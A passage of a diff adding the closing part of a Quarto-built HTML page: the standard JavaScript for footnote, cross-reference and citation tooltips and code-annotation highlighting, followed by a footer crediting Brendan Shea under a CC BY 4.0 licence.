+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+<p>© Brendan Shea, PhD · <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></p>
+</div>   
+    <div class="nav-footer-center">
+      &nbsp;
+    </div>
+    <div class="nav-footer-right">
+<p>Built with <a href="https://quarto.org">Quarto</a></p>
+</div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
